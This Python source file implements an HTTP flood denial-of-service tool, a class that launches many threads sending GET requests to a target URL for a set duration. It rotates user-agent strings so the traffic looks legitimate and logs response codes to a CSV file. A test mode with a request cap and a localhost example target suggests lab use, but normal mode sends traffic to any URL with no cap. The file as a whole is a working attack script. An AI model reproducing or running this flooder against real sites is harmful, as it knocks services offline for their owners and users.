import requests
import threading
import time
import random
from typing import List, Optional
import logging
import csv
from datetime import datetime
import os

class HTTPFloodAttack:
    def __init__(self, target_url: str, num_threads: int = 10, duration: int = 60, 
                 test_mode: bool = False, max_requests: Optional[int] = None,
                 log_file: Optional[str] = None):
        self.target_url = target_url
        self.num_threads = num_threads
        self.duration = duration
        self.is_attacking = False
        self.threads: List[threading.Thread] = []
        self.test_mode = test_mode
        self.max_requests = max_requests
        self.total_requests = 0
        self.request_lock = threading.Lock()
        
        # Setup logging
        logging.basicConfig(level=logging.INFO)
        self.logger = logging.getLogger(__name__)
        
        # Setup packet logging
        self.log_file = log_file
        if self.log_file:
            self._setup_logging()

    def _setup_logging(self):
        """Setup CSV logging for requests"""
        log_dir = os.path.dirname(self.log_file)
        if log_dir and not os.path.exists(log_dir):
            os.makedirs(log_dir)
            
        with open(self.log_file, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(['timestamp', 'source_ip', 'target_url', 'status_code', 'response_time'])

    def _log_request(self, status_code: int, response_time: float):
        """Log request details to CSV"""
        if self.log_file:
            with open(self.log_file, 'a', newline='') as f:
                writer = csv.writer(f)
                writer.writerow([
                    datetime.now().isoformat(),
                    '127.0.0.1',  # In test mode, we're always localhost
                    self.target_url,
                    status_code,
                    response_time
                ])

    def _attack_thread(self):
        """Individual attack thread that sends HTTP requests"""
        while self.is_attacking:
            try:
                # Check if we've reached max requests in test mode
                if self.test_mode and self.max_requests:
                    with self.request_lock:
                        if self.total_requests >= self.max_requests:
                            break
                        self.total_requests += 1

                # Random user agent to make requests look more legitimate
                user_agents = [
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
                ]
                
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                }
                
                start_time = time.time()
                response = requests.get(self.target_url, headers=headers, timeout=5)
                response_time = time.time() - start_time
                
                self._log_request(response.status_code, response_time)
                self.logger.debug(f"Request sent - Status: {response.status_code}, Time: {response_time:.2f}s")
                
            except requests.exceptions.RequestException as e:
                self.logger.error(f"Request failed: {str(e)}")
                self._log_request(0, 0)  # Log failed request
            
            # Add delay in test mode
            if self.test_mode:
                time.sleep(0.5)  # 500ms delay in test mode
            else:
                time.sleep(0.1)  # 100ms delay in normal mode

    def start(self):
        """Start the HTTP flood attack"""
        self.is_attacking = True
        self.logger.info(f"Starting HTTP flood attack on {self.target_url}")
        self.logger.info(f"Launching {self.num_threads} attack threads")
        if self.test_mode:
            self.logger.info("Running in TEST MODE")
            if self.max_requests:
                self.logger.info(f"Will stop after {self.max_requests} requests")
        
        # Create and start threads
        for _ in range(self.num_threads):
            thread = threading.Thread(target=self._attack_thread)
            thread.daemon = True
            self.threads.append(thread)
            thread.start()
        
        # Set timer to stop attack
        threading.Timer(self.duration, self.stop).start()

    def stop(self):
        """Stop the HTTP flood attack"""
        self.is_attacking = False
        self.logger.info("Stopping HTTP flood attack")
        
        # Wait for all threads to complete
        for thread in self.threads:
            thread.join()
        
        self.threads.clear()
        self.logger.info(f"Attack stopped. Total requests: {self.total_requests}")

if __name__ == "__main__":
    # Example usage
    target = "http://localhost:5000"
    attack = HTTPFloodAttack(
        target_url=target,
        num_threads=5,
        duration=30,
        test_mode=True,
        max_requests=100,
        log_file="logs/http_flood_attack.csv"
    )
    attack.start() 